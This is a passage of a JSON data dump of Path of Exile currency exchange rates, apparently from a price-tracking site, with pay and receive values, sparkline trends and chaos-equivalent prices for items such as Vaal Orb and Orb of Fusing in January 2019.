Sextant","pay":{"id":0,"league_id":1,"pay_currency_id":48,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":20,"value":0.24879285714285715,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":48,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":64,"value":4.911668875,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,3.39,3.39,3.39,3.39,3.39,3.89],"totalChange":3.89},"receiveSparkLine":{"data":[0,0,0,18.72,22.5,15.17,22.79],"totalChange":22.79},"chaosEquivalent":4.47,"lowConfidencePaySparkLine":{"data":[0,3.39,3.39,3.39,3.39,3.39,3.89],"totalChange":3.89},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,18.72,22.5,15.17,22.79],"totalChange":22.79},"detailsId":"master-cartographers-sextant"},"Blessing of Esh":{"currencyTypeName":"Blessing of Esh","pay":{"id":0,"league_id":1,"pay_currency_id":63,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":0.5,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":63,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":23,"value":4,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"chaosEquivalent":3,"lowConfidencePaySparkLine":{"data":[null,null,0,100,100,100,100],"totalChange":100},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"detailsId":"blessing-of-esh"},"Journeyman Cartographer\'s Sextant":{"currencyTypeName":"Journeyman Cartographer\'s Sextant","pay":{"id":0,"league_id":1,"pay_currency_id":47,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":17,"value":0.4230887878787879,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":47,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":100,"value":2.918542857142857,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,0.13,0.05,0.37,0.41,1.71,2.08],"totalChange":2.08},"receiveSparkLine":{"data":[0,-2.76,-16.27,-10.35,0.42,3.99,4.66],"totalChange":4.66},"chaosEquivalent":2.64,"lowConfidencePaySparkLine":{"data":[0,0.13,0.05,0.37,0.41,1.71,2.08],"totalChange":2.08},"lowConfidenceReceiveSparkLine":{"data":[0,-2.76,-16.27,-10.35,0.42,3.99,4.66],"totalChange":4.66},"detailsId":"journeyman-cartographers-sextant"},"Blessing of Xoph":{"currencyTypeName":"Blessing of Xoph","pay":{"id":0,"league_id":1,"pay_currency_id":61,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":0.5,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":61,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":24,"value":2.483673469387755,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-33.33,-33.33,-33.33,-33.33,-9.93,-17.21],"totalChange":-17.21},"chaosEquivalent":2.24,"lowConfidencePaySparkLine":{"data":[null,null,0,100,100,100,100],"totalChange":100},"lowConfidenceReceiveSparkLine":{"data":[0,-33.33,-33.33,-33.33,-33.33,-9.93,-17.21],"totalChange":-17.21},"detailsId":"blessing-of-xoph"},"Annulment Shard":{"currencyTypeName":"Annulment Shard","pay":{"id":0,"league_id":1,"pay_currency_id":79,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":1.5,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":79,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":2,"value":3.8,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[],"totalChange":0},"chaosEquivalent":2.23,"lowConfidencePaySparkLine":{"data":[null,null,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,0,-9.09,-9.09,1718.18,1718.18,245.45],"totalChange":245.45},"detailsId":"annulment-shard"},"Blessing of Tul":{"currencyTypeName":"Blessing of Tul","pay":{"id":0,"league_id":1,"pay_currency_id":62,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":0.5,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":62,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":15,"value":2,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,0,0,22.91,0,0,0],"totalChange":0},"chaosEquivalent":2,"lowConfidencePaySparkLine":{"data":[null,null,0,0,0,0,100],"totalChange":100},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,22.91,0,0,0],"totalChange":0},"detailsId":"blessing-of-tul"},"Vaal Orb":{"currencyTypeName":"Vaal Orb","pay":{"id":0,"league_id":1,"pay_currency_id":8,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":40,"value":0.5834604444444444,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":8,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":81,"value":1.7833907142857144,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,3.03,3.03,3.03,3.03,3.03,3.87],"totalChange":3.87},"receiveSparkLine":{"data":[0,4.08,2.53,1.19,4.08,4.08,3.12],"totalChange":3.12},"chaosEquivalent":1.75,"lowConfidencePaySparkLine":{"data":[0,3.03,3.03,3.03,3.03,3.03,3.87],"totalChange":3.87},"lowConfidenceReceiveSparkLine":{"data":[0,4.08,2.53,1.19,4.08,4.08,3.12],"totalChange":3.12},"detailsId":"vaal-orb"},"Orb of Horizons":{"currencyTypeName":"Orb of Horizons","pay":{"id":0,"league_id":1,"pay_currency_id":75,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":2,"value":0.958204,"data_point_count":1,"includes_secondary":true},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":75,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":31,"value":1.79100045,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-6.68,5.03,-3.73,-4.13,-2.13,-4.61],"totalChange":-4.61},"chaosEquivalent":1.42,"lowConfidencePaySparkLine":{"data":[0,-0.33,0.72,4.29,0.72,-3.63,4.36],"totalChange":4.36},"lowConfidenceReceiveSparkLine":{"data":[0,-6.68,5.03,-3.73,-4.13,-2.13,-4.61],"totalChange":-4.61},"detailsId":"orb-of-horizons"},"Splinter of Chayula":{"currencyTypeName":"Splinter of Chayula","pay":{"id":0,"league_id":1,"pay_currency_id":60,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":3,"value":0.83333,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":60,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":46,"value":1.5,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,5.26,-9.67,0.7,-21.05,-21.05,-21.05],"totalChange":-21.05},"chaosEquivalent":1.35,"lowConfidencePaySparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,5.26,-9.67,0.7,-21.05,-21.05,-21.05],"totalChange":-21.05},"detailsId":"splinter-of-chayula"},"Gemcutter\'s Prism":{"currencyTypeName":"Gemcutter\'s Prism","pay":{"id":0,"league_id":1,"pay_currency_id":15,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":14,"value":0.7885894949494949,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":15,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":74,"value":1.3104130434782608,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,-0.9,-0.9,-1.01,4.44,-0.9,4.73],"totalChange":4.73},"receiveSparkLine":{"data":[0,4.2,4.37,1.67,5.04,1.93,1.19],"totalChange":1.19},"chaosEquivalent":1.29,"lowConfidencePaySparkLine":{"data":[0,-0.9,-0.9,-1.01,4.44,-0.9,4.73],"totalChange":4.73},"lowConfidenceReceiveSparkLine":{"data":[0,4.2,4.37,1.67,5.04,1.93,1.19],"totalChange":1.19},"detailsId":"gemcutters-prism"},"Apprentice Cartographer\'s Sextant":{"currencyTypeName":"Apprentice Cartographer\'s Sextant","pay":{"id":0,"league_id":1,"pay_currency_id":46,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":14,"value":0.9750981212121212,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":46,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":52,"value":1,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-5.02,-6.61,-3.17,-2.11,-3.38,-4.22],"totalChange":-4.22},"receiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"chaosEquivalent":1.01,"lowConfidencePaySparkLine":{"data":[0,-5.02,-6.61,-3.17,-2.11,-3.38,-4.22],"totalChange":-4.22},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"detailsId":"apprentice-cartographers-sextant"},"Orb of Regret":{"currencyTypeName":"Orb of Regret","pay":{"id":0,"league_id":1,"pay_currency_id":9,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":18,"value":1.0964574468085106,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":9,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":92,"value":1.0004330666666668,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,0,0.84,0.94,0.31,0.11,0.32],"totalChange":0.32},"receiveSparkLine":{"data":[0,0,0,0,1.51,0,0.04],"totalChange":0.04},"chaosEquivalent":0.96,"lowConfidencePaySparkLine":{"data":[0,0,0.84,0.94,0.31,0.11,0.32],"totalChange":0.32},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,1.51,0,0.04],"totalChange":0.04},"detailsId":"orb-of-regret"},"Regal Orb":{"currencyTypeName":"Regal Orb","pay":{"id":0,"league_id":1,"pay_currency_id":7,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":10,"value":1.3920958247422681,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":7,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":73,"value":0.8269064536082474,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,0.04,0,0,0,0.12,0.57],"totalChange":0.57},"receiveSparkLine":{"data":[0,-0.09,-2.23,0.79,-1.6,1.46,0.7],"totalChange":0.7},"chaosEquivalent":0.77,"lowConfidencePaySparkLine":{"data":[0,0.04,0,0,0,0.12,0.57],"totalChange":0.57},"lowConfidenceReceiveSparkLine":{"data":[0,-0.09,-2.23,0.79,-1.6,1.46,0.7],"totalChange":0.7},"detailsId":"regal-orb"},"Engineer\'s Orb":{"currencyTypeName":"Engineer\'s Orb","pay":{"id":0,"league_id":1,"pay_currency_id":77,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":3,"value":2.605612244897959,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":77,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":17,"value":0.8584277931034483,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,18.02,26.46,12.78,12.41,12.81,11.17],"totalChange":11.17},"chaosEquivalent":0.62,"lowConfidencePaySparkLine":{"data":[0,2,11.98,11.98,30.74,30.74,30.49],"totalChange":30.49},"lowConfidenceReceiveSparkLine":{"data":[0,18.02,26.46,12.78,12.41,12.81,11.17],"totalChange":11.17},"detailsId":"engineers-orb"},"Orb of Fusing":{"currencyTypeName":"Orb of Fusing","pay":{"id":0,"league_id":1,"pay_currency_id":5,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":25,"value":1.95,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":5,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":100,"value":0.55044,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,0,0.78,0.62,0.54,2.53,2.56],"totalChange":2.56},"receiveSparkLine":{"data":[0,-0.93,-2.39,-0.55,-1.99,-1,-0.92],"totalChange":-0.92},"chaosEquivalent":0.53,"lowConfidencePaySparkLine":{"data":[0,0,0.78,0.62,0.54,2.53,2.56],"totalChange":2.56},"lowConfidenceReceiveSparkLine":{"data":[0,-0.93,-2.39,-0.55,-1.99,-1,-0.92],"totalChange":-0.92},"detailsId":"orb-of-fusing"},"Orb of Scouring":{"currencyTypeName":"Orb of Scouring","pay":{"id":0,"league_id":1,"pay_currency_id":14,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":8,"value":2.1,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":14,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":91,"value":0.5354012105263158,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,4.55,4.55,4.55,5.09,8.71,9.52],"totalChange":9.52},"receiveSparkLine":{"data":[0,0,0,0,0,-0.56,7.08],"totalChange":7.08},"chaosEquivalent":0.51,"lowConfidencePaySparkLine":{"data":[0,4.55,4.55,4.55,5.09,8.71,9.52],"totalChange":9.52},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,-0.56,7.08],"totalChange":7.08},"detailsId":"orb-of-scouring"},"Cartographer\'s Chisel":{"currencyTypeName":"Cartographer\'s Chisel","pay":{"id":0,"league_id":1,"pay_currency_id":10,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":26,"value":2.4,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":10,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":58,"value":0.46549529545454543,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-3.14,-3.14,0.9,0.9,0.9,0.9],"totalChange":0.9},"receiveSparkLine":{"data":[0,0.97,-2.18,1.69,-2.38,-1.15,-0.13],"totalChange":-0.13},"chaosEquivalent":0.44,"lowConfidencePaySparkLine":{"data":[0,-3.14,-3.14,0.9,0.9,0.9,0.9],"totalChange":0.9},"lowConfidenceReceiveSparkLine":{"data":[0,0.97,-2.18,1.69,-2.38,-1.15,-0.13],"totalChange":-0.13},"detailsId":"cartographers-chisel"},"Orb of Alchemy":{"currencyTypeName":"Orb of Alchemy","pay":{"id":0,"league_id":1,"pay_currency_id":4,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":25,"value":2.841666666666667,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":4,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":65,"value":0.35714,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-0.63,0.07,6.42,6.41,2.75,4.86],"totalChange":4.86},"receiveSparkLine":{"data":[0,2.66,-5.08,-7.82,-6.04,-6.22,-14.4],"totalChange":-14.4},"chaosEquivalent":0.35,"lowConfidencePaySparkLine":{"data":[0,-0.63,0.07,6.42,6.41,2.75,4.86],"totalChange":4.86},"lowConfidenceReceiveSparkLine":{"data":[0,2.66,-5.08,-7.82,-6.04,-6.22,-14.4],"totalChange":-14.4},"detailsId":"orb-of-alchemy"},"Silver Coin":{"currencyTypeName":"Silver Coin","pay":{"id":0,"league_id":1,"pay_currency_id":12,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":15,"value":3.6,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":12,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":47,"value":0.3146063292682927,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,5.33,2.76,0.91,2.92,3.72,3.72],"totalChange":3.72},"receiveSparkLine":{"data":[0,-8.82,-8.94,-8.94,-8.94,2.68,0.27],"totalChange":0.27},"chaosEquivalent":0.3,"lowConfidencePaySparkLine":{"data":[0,5.33,2.76,0.91,2.92,3.72,3.72],"totalChange":3.72},"lowConfidenceReceiveSparkLine":{"data":[0,-8.82,-8.94,-8.94,-8.94,2.68,0.27],"totalChange":0.27},"detailsId":"silver-coin"},"Blessed Orb":{"currencyTypeName":"Blessed Orb","pay":{"id":0,"league_id":1,"pay_currency_id":18,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":10,"value":3.7901630434782607,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":18,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":53,"value":0.32171585542168674,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,0.1,0.06,0.06,0.7,0.23,0.25],"totalChange":0.25},"receiveSparkLine":{"data":[0,0,-1.04,-1.47,-1.55,0,-3.48],"totalChange":-3.48},"chaosEquivalent":0.29,"lowConfidencePaySparkLine":{"data":[0,0.1,0.06,0.06,0.7,0.23,0.25],"totalChange":0.25},"lowConfidenceReceiveSparkLine":{"data":[0,0,-1.04,-1.47,-1.55,0,-3.48],"totalChange":-3.48},"detailsId":"blessed-orb"},"Chromatic Orb":{"currencyTypeName":"Chromatic Orb","pay":{"id":0,"league_id":1,"pay_currency_id":17,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":30,"value":3.900757575757576,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":17,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":91,"value":0.27702283333333333,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-1.17,-1.9,-0.9,-0.75,0.03,0.01],"totalChange":0.01},"receiveSparkLine":{"data":[0,-1.38,-1.35,-2.08,-2.08,-2.08,-2.35],"totalChange":-2.35},"chaosEquivalent":0.27,"lowConfidencePaySparkLine":{"data":[0,-1.17,-1.9,-0.9,-0.75,0.03,0.01],"totalChange":0.01},"lowConfidenceReceiveSparkLine":{"data":[0,-1.38,-1.35,-2.08,-2.08,-2.08,-2.35],"totalChange":-2.35},"detailsId":"chromatic-orb"},"Orb of Binding":{"currencyTypeName":"Orb of Binding","pay":{"id":0,"league_id":1,"pay_currency_id":74,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":6,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":74,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":28,"value":0.33333,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"chaosEquivalent":0.25,"lowConfidencePaySparkLine":{"data":[null,null,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"detailsId":"orb-of-binding"},"Splinter of Xoph":{"currencyTypeName":"Splinter of Xoph","pay":{"id":0,"league_id":1,"pay_currency_id":56,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":8,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":56,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":29,"value":0.33333,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-5.08,-14.97,8.86,-18.21,-14.21,-20.82],"totalChange":-20.82},"chaosEquivalent":0.23,"lowConfidencePaySparkLine":{"data":[null,null,0,14.29,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,-5.08,-14.97,8.86,-18.21,-14.21,-20.82],"totalChange":-20.82},"detailsId":"splinter-of-xoph"},"Splinter of Uul-Netol":{"currencyTypeName":"Splinter of Uul-Netol","pay":{"id":0,"league_id":1,"pay_currency_id":59,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":15,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":59,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":26,"value":0.33333,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,1.07,1.07,1.07,1.07,1.07,1.07],"totalChange":1.07},"chaosEquivalent":0.2,"lowConfidencePaySparkLine":{"data":[null,null,0,50,50,50,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,1.07,1.07,1.07,1.07,1.07,1.07],"totalChange":1.07},"detailsId":"splinter-of-uul-netol"},"Orb of Alteration":{"currencyTypeName":"Orb of Alteration","pay":{"id":0,"league_id":1,"pay_currency_id":6,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":32,"value":6.897234042553191,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":6,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":61,"value":0.14286,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,3.09,4.16,5.69,9.14,5.69,4.2],"totalChange":4.2},"receiveSparkLine":{"data":[0,-0.03,-0.5,-0.41,-0.73,0,0],"totalChange":0},"chaosEquivalent":0.14,"lowConfidencePaySparkLine":{"data":[0,3.09,4.16,5.69,9.14,5.69,4.2],"totalChange":4.2},"lowConfidenceReceiveSparkLine":{"data":[0,-0.03,-0.5,-0.41,-0.73,0,0],"totalChange":0},"detailsId":"orb-of-alteration"},"Jeweller\'s Orb":{"currencyTypeName":"Jeweller\'s Orb","pay":{"id":0,"league_id":1,"pay_currency_id":11,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":24,"value":7.8,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":11,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":75,"value":0.13261883720930231,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,0.3,1.86,3.61,3.33,4.92,6.27],"totalChange":6.27},"receiveSparkLine":{"data":[0,-1.86,1.35,-2.11,-3.08,-1.86,-2.39],"totalChange":-2.39},"chaosEquivalent":0.13,"lowConfidencePaySparkLine":{"data":[0,0.3,1.86,3.61,3.33,4.92,6.27],"totalChange":6.27},"lowConfidenceReceiveSparkLine":{"data":[0,-1.86,1.35,-2.11,-3.08,-1.86,-2.39],"totalChange":-2.39},"detailsId":"jewellers-orb"},"Orb of Chance":{"currencyTypeName":"Orb of Chance","pay":{"id":0,"league_id":1,"pay_currency_id":16,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":7,"value":8.64997340425532,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":16,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":76,"value":0.11111,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-3.04,0.02,0.72,-0.25,-0.36,7.21],"totalChange":7.21},"receiveSparkLine":{"data":[0,0,1.83,0,-2.24,0,-5.56],"totalChange":-5.56},"chaosEquivalent":0.11,"lowConfidencePaySparkLine":{"data":[0,-3.04,0.02,0.72,-0.25,-0.36,7.21],"totalChange":7.21},"lowConfidenceReceiveSparkLine":{"data":[0,0,1.83,0,-2.24,0,-5.56],"totalChange":-5.56},"detailsId":"orb-of-chance"},"Glassblower\'s Bauble":{"currencyTypeName":"Glassblower\'s Bauble","pay":{"id":0,"league_id":1,"pay_currency_id":19,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":4,"value":15.31340206185567,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":19,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":51,"value":0.14286,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-0.12,0,1.2,2.08,3.07,3.07],"totalChange":3.07},"chaosEquivalent":0.1,"lowConfidencePaySparkLine":{"data":[0,0,-1.94,3.94,3.9,3.9,9.05],"totalChange":9.05},"lowConfidenceReceiveSparkLine":{"data":[0,-0.12,0,1.2,2.08,3.07,3.07],"totalChange":3.07},"detailsId":"glassblowers-bauble"},"Splinter of Tul":{"currencyTypeName":"Splinter of Tul","pay":{"id":0,"league_id":1,"pay_currency_id":57,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":20,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":57,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":23,"value":0.14089376744186047,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,4.1,4.81,5.81,5.86,9.04,18.99],"totalChange":18.99},"chaosEquivalent":0.1,"lowConfidencePaySparkLine":{"data":[null,null,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,4.1,4.81,5.81,5.86,9.04,18.99],"totalChange":18.99},"detailsId":"splinter-of-tul"},"Splinter of Esh":{"currencyTypeName":"Splinter of Esh","pay":{"id":0,"league_id":1,"pay_currency_id":58,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":20,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":58,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":29,"value":0.1326773181818182,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,0.47,0.74,8.18,8.18,8.18,0.47],"totalChange":0.47},"chaosEquivalent":0.09,"lowConfidencePaySparkLine":{"data":[null,null,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,0.47,0.74,8.18,8.18,8.18,0.47],"totalChange":0.47},"detailsId":"splinter-of-esh"},"Orb of Augmentation":{"currencyTypeName":"Orb of Augmentation","pay":{"id":0,"league_id":1,"pay_currency_id":20,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":5,"value":42.121212121212125,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":20,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":47,"value":0.035082486842105264,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[null,null,null,null,null,null,0],"totalChange":0},"receiveSparkLine":{"data":[0,0,0,0,0,1.83,5.26],"totalChange":5.26},"chaosEquivalent":0.03,"lowConfidencePaySparkLine":{"data":[0,-45.46,-46.56,-41.35,-39.88,-39.88,-42.9],"totalChange":-42.9},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,1.83,5.26],"totalChange":5.26},"detailsId":"orb-of-augmentation"},"Blacksmith\'s Whetstone":{"currencyTypeName":"Blacksmith\'s Whetstone","pay":{"id":0,"league_id":1,"pay_currency_id":25,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":8,"value":137.4747474747475,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":25,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":38,"value":0.024965935064935066,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,21.31,20.44,18.01,21.49,17.2,20.28],"totalChange":20.28},"receiveSparkLine":{"data":[0,-12.72,-18.33,-18.7,-16.53,-16.53,-16.64],"totalChange":-16.64},"chaosEquivalent":0.02,"lowConfidencePaySparkLine":{"data":[0,21.31,20.44,18.01,21.49,17.2,20.28],"totalChange":20.28},"lowConfidenceReceiveSparkLine":{"data":[0,-12.72,-18.33,-18.7,-16.53,-16.53,-16.64],"totalChange":-16.64},"detailsId":"blacksmiths-whetstone"},"Perandus Coin":{"currencyTypeName":"Perandus 